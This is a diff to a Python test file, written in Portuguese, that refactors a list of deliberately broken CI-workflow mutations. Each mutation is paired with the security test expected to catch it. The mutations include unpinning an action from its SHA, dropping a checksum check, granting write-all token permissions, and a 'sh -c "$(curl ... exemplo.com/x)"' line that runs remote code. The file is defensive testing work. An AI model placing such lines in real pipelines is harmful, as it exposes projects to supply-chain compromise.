@@ -42,6 +42,22 @@ ESTRAGOS = [
      "src/filas.py: funcoesAcima 1"),
 ]
 SEM_TESTES_NO_COMMIT = {**os.environ, "MORG_A_TESTAR": "1"}
+# Os estragos do workflow, um de cada vez: (trecho certo, trecho estragado ou None para tirar a linha, teste que falha).
+ESTRAGOS_DO_CI = [
+    ("actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "actions/checkout@v7",
+     "test_cada_action_fixada_por_sha_com_a_versao"),
+    ("sha256sum -c", None, "test_nada_baixado_direto_para_uma_shell"),
+    # O bloco do topo continua só de leitura; o job ganha escrita por baixo dele.
+    ("    timeout-minutes: 10\n", "    timeout-minutes: 10\n    permissions:\n      contents: write\n",
+     "test_o_token_so_le_e_o_checkout_nao_guarda_a_credencial"),
+    ("  segredos:\n", "  segredos:\n    permissions: write-all\n", "test_o_token_so_le_e_o_checkout_nao_guarda_a_credencial"),
+    ("          tar -xzf", '          sh -c "$(curl -sSfL https://exemplo.com/x)"\n          tar -xzf',
+     "test_nada_baixado_direto_para_uma_shell"),
+    ("          tar -xzf", "          curl -sSfL https://exemplo.com/f.tar.gz > f.tar.gz\n          tar -xzf",
+     "test_nada_baixado_direto_para_uma_shell"),
+    ("          tar -xzf", "          curl -sSfL --output f.tar.gz https://exemplo.com/f.tar.gz\n          tar -xzf",
+     "test_nada_baixado_direto_para_uma_shell"),
+]
 
 
 class ProjetoDeExemplo(unittest.TestCase):
@@ -123,24 +139,8 @@ class ProjetoDeExemplo(unittest.TestCase):
         escrever(ci, texto.replace(antes, depois, 1))
 
     def test_o_ci_estragado(self):
-        casos = [
-            ("actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "actions/checkout@v7",
-             "test_cada_action_fixada_por_sha_com_a_versao"),
-            ("sha256sum -c", None, "test_nada_baixado_direto_para_uma_shell"),  # None: tira a linha inteira
-            # O bloco do topo continua só de leitura; o job ganha escrita por baixo dele.
-            ("    timeout-minutes: 10\n", "    timeout-minutes: 10\n    permissions:\n      contents: write\n",
-             "test_o_token_so_le_e_o_checkout_nao_guarda_a_credencial"),
-            ("  segredos:\n", "  segredos:\n    permissions: write-all\n",
-             "test_o_token_so_le_e_o_checkout_nao_guarda_a_credencial"),
-            ("          tar -xzf", '          sh -c "$(curl -sSfL https://exemplo.com/x)"\n          tar -xzf',
-             "test_nada_baixado_direto_para_uma_shell"),
-            ("          tar -xzf", "          curl -sSfL https://exemplo.com/f.tar.gz > f.tar.gz\n          tar -xzf",
-             "test_nada_baixado_direto_para_uma_shell"),
-            ("          tar -xzf", "          curl -sSfL --output f.tar.gz https://exemplo.com/f.tar.gz\n          tar -xzf",
-             "test_nada_baixado_direto_para_uma_shell"),
-        ]
         original = (self.pasta / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
-        for antes, depois, teste in casos:
+        for antes, depois, teste in ESTRAGOS_DO_CI:
             with self.subTest(estrago=depois or antes):
                 escrever(self.pasta / ".github" / "workflows" / "ci.yml", original)
                 if depois is None:
